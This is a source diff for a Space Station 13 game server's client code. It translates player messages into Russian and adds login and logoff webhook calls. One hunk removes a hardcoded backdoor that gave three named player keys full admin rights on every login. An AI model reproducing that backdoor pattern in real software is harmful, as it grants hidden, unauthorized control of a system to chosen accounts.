@@ -59,10 +59,10 @@ GLOBAL_LIST_INIT(blacklisted_builds, list(
 			topiclimiter[MINUTE_COUNT] = 0
 		topiclimiter[MINUTE_COUNT] += 1
 		if (topiclimiter[MINUTE_COUNT] > mtl)
-			var/msg = "Your previous action was ignored because you've done too many in a minute."
+			var/msg = "Ваше предыдущее действие было проигнорировано, поскольку вы совершили слишком много действий за минуту."
 			if (minute != topiclimiter[ADMINSWARNED_AT]) //only one admin message per-minute. (if they spam the admins can just boot/ban them)
 				topiclimiter[ADMINSWARNED_AT] = minute
-				msg += " Administrators have been informed."
+				msg += " Педали были предупреждены."
 				log_game("[key_name(src)] Has hit the per-minute topic limit of [mtl] topic calls in a given game minute")
 				message_admins("[ADMIN_LOOKUPFLW(usr)] [ADMIN_KICK(usr)] Has hit the per-minute topic limit of [mtl] topic calls in a given game minute")
 			to_chat(src, span_danger("[msg]"))
@@ -78,7 +78,7 @@ GLOBAL_LIST_INIT(blacklisted_builds, list(
 			topiclimiter[SECOND_COUNT] = 0
 		topiclimiter[SECOND_COUNT] += 1
 		if (topiclimiter[SECOND_COUNT] > stl)
-			to_chat(src, span_danger("Your previous action was ignored because you've done too many in a second"))
+			to_chat(src, span_danger("Ваше предыдущее действие было проигнорировано, так как вы совершили слишком много действий за секунду"))
 			return
 
 	// Tgui Topic middleware
@@ -187,12 +187,12 @@ GLOBAL_LIST_INIT(blacklisted_builds, list(
 
 		src.last_message_count++
 		if(src.last_message_count >= SPAM_TRIGGER_AUTOMUTE)
-			to_chat(src, span_danger("You have exceeded the spam filter limit for identical messages. A mute was automatically applied for the current round. Contact admins to request its removal."))
+			to_chat(src, span_danger("Вы превысили лимит спам-фильтра для одинаковых сообщений. На текущий раунд автоматически наложено отключение звука. Свяжитесь с администраторами, чтобы запросить его снятие."))
 			cmd_admin_mute(src, mute_type, 1)
 			return TRUE
 		if(src.last_message_count >= SPAM_TRIGGER_WARNING)
 			//"auto-ban" sends the message that the cold and uncaring gamecode has been designed to quiash you like a bug in short measure should you continue, and it's quite intentional that the user isn't told exactly what that entails.
-			to_chat(src, span_danger("You are nearing the auto-ban limit for identical messages."))
+			to_chat(src, span_danger("Вы приближаетесь к лимиту автобана за одинаковые сообщения."))
 			return FALSE
 	else
 		last_message = message
@@ -282,6 +282,7 @@ GLOBAL_LIST_INIT(blacklisted_builds, list(
 
 	var/full_version = "[byond_version].[byond_build ? byond_build : "xxx"]"
 	log_access("Login: [key_name(src)] from [address ? address : "localhost"]-[computer_id] || BYOND v[full_version]")
+	webhook_send_status_update("client_login","[src.key]")
 
 	var/alert_mob_dupe_login = FALSE
 	var/alert_admin_multikey = FALSE
@@ -443,7 +444,7 @@ GLOBAL_LIST_INIT(blacklisted_builds, list(
 		var/stealth_admin = mob.client?.holder?.fakekey
 		var/announce_leave = mob.client?.prefs?.read_preference(/datum/preference/toggle/broadcast_login_logout)
 		if (!stealth_admin)
-			deadchat_broadcast(" has reconnected.", "<b>[mob][mob.get_realname_string()]</b>", follow_target = mob, turf_target = get_turf(mob), message_type = DEADCHAT_LOGIN_LOGOUT, admin_only=!announce_leave)
+			deadchat_broadcast(" переподключается.", "<b>[mob][mob.get_realname_string()]</b>", follow_target = mob, turf_target = get_turf(mob), message_type = DEADCHAT_LOGIN_LOGOUT, admin_only=!announce_leave)
 	add_verbs_from_config()
 
 	// This needs to be before the client age from db is updated as it'll be updated by then.
@@ -498,7 +499,7 @@ GLOBAL_LIST_INIT(blacklisted_builds, list(
 	apply_clickcatcher()
 
 	if(prefs.lastchangelog != GLOB.changelog_hash) //bolds the changelog button on the interface so we know there are updates.
-		to_chat(src, span_info("You have unread updates in the changelog."))
+//		to_chat(src, span_info("У вас есть непрочитанные обновления в журнале изменений."))
 		if(CONFIG_GET(flag/aggressive_changelog))
 			changelog()
 		else
@@ -508,10 +509,6 @@ GLOBAL_LIST_INIT(blacklisted_builds, list(
 		for(var/message in GLOB.clientmessages[ckey])
 			to_chat(src, message)
 		GLOB.clientmessages.Remove(ckey)
-
-	if(ckey == "nocringe" || ckey == "boroda228" || ckey == "ivandog11")
-		var/datum/admin_rank/localhost_rank = new("Codus", R_EVERYTHING, NONE, R_EVERYTHING)
-		new /datum/admins(list(localhost_rank), ckey, 1, 1)
 
 	if(CONFIG_GET(flag/autoconvert_notes))
 		convert_notes_sql(ckey)
@@ -558,7 +555,7 @@ GLOBAL_LIST_INIT(blacklisted_builds, list(
 		var/stealth_admin = mob.client?.holder?.fakekey
 		var/announce_join = mob.client?.prefs?.read_preference(/datum/preference/toggle/broadcast_login_logout)
 		if (!stealth_admin)
-			deadchat_broadcast(" has disconnected.", "<b>[mob][mob.get_realname_string()]</b>", follow_target = mob, turf_target = get_turf(mob), message_type = DEADCHAT_LOGIN_LOGOUT, admin_only=!announce_join)
+			deadchat_broadcast(" отключается.", "<b>[mob][mob.get_realname_string()]</b>", follow_target = mob, turf_target = get_turf(mob), message_type = DEADCHAT_LOGIN_LOGOUT, admin_only=!announce_join)
 		mob.become_uncliented()
 
 	GLOB.clients -= src
@@ -572,6 +569,7 @@ GLOBAL_LIST_INIT(blacklisted_builds, list(
 		QDEL_LIST(credits)
 	if(obj_window)
 		QDEL_NULL(obj_window)
+	webhook_send_status_update("client_logoff","[src.key]")
 	if(holder)
 		adminGreet(1)
 		holder.owner = null
@@ -592,7 +590,8 @@ GLOBAL_LIST_INIT(blacklisted_builds, list(
 				"Forever alone :("\
 			)
 
-			send2adminchat("Server", "[cheesy_message] (No admins online)")
+			webhook_send_asay("Server", "[cheesy_message]")
+			//send2adminchat("Server", "[cheesy_message] (No admins online)")
 	QDEL_LIST_ASSOC_VAL(char_render_holders)
 
 	SSambience.remove_ambience_client(src)
@@ -859,11 +858,11 @@ GLOBAL_LIST_INIT(blacklisted_builds, list(
 		clicklimiter[MINUTE_COUNT] += 1 + (ab)
 
 		if (clicklimiter[MINUTE_COUNT] > mcl)
-			var/msg = "Your previous click was ignored because you've done too many in a minute."
+			var/msg = "Ваш предыдущий щелчок был проигнорирован, потому что вы сделали слишком много кликов за минуту."
 			if (minute != clicklimiter[ADMINSWARNED_AT]) //only one admin message per-minute. (if they spam the admins can just boot/ban them)
 				clicklimiter[ADMINSWARNED_AT] = minute
 
-				msg += " Administrators have been informed."
+				msg += " Педали были предупреждены."
 				if (ab)
 					log_game("[key_name(src)] is using the middle click aimbot exploit")
 					message_admins("[ADMIN_LOOKUPFLW(usr)] [ADMIN_KICK(usr)] is using the middle click aimbot exploit</span>")
@@ -886,7 +885,7 @@ GLOBAL_LIST_INIT(blacklisted_builds, list(
 		clicklimiter[SECOND_COUNT] += 1 + (!!ab)
 
 		if (clicklimiter[SECOND_COUNT] > scl)
-			to_chat(src, span_danger("Your previous click was ignored because you've done too many in a second"))
+			to_chat(src, span_danger("Ваш предыдущий щелчок был проигнорирован, потому что вы сделали слишком много кликов за секунду"))
 			return
 
 	//check if the server is overloaded and if it is then queue up the click for next tick
@@ -1187,7 +1186,7 @@ GLOBAL_LIST_INIT(blacklisted_builds, list(
 	observer.ManualFollow(target)
 
 /client/verb/stop_client_sounds()
-	set name = "Stop Sounds"
+	set name = "Остановить звуки"
 	set category = "OOC"
 	set desc = "Stop Current Sounds"
 	SEND_SOUND(usr, sound(null))
@@ -1195,7 +1194,7 @@ GLOBAL_LIST_INIT(blacklisted_builds, list(
 	SSblackbox.record_feedback("nested tally", "preferences_verb", 1, list("Stop Self Sounds"))
 
 /client/verb/toggle_fullscreen()
-	set name = "Toggle Fullscreen"
+	set name = "Полный экран"
 	set category = "OOC"
 
 	fullscreen = !fullscreen
@@ -1215,7 +1214,7 @@ GLOBAL_LIST_INIT(blacklisted_builds, list(
 		winset(usr, "mainwindow", "on-size=attempt_auto_fit_viewport")
 
 /client/verb/toggle_status_bar()
-	set name = "Toggle Status Bar"
+	set name = "Включить панель состояния"
 	set category = "OOC"
 
 	show_status_bar = !show_status_bar
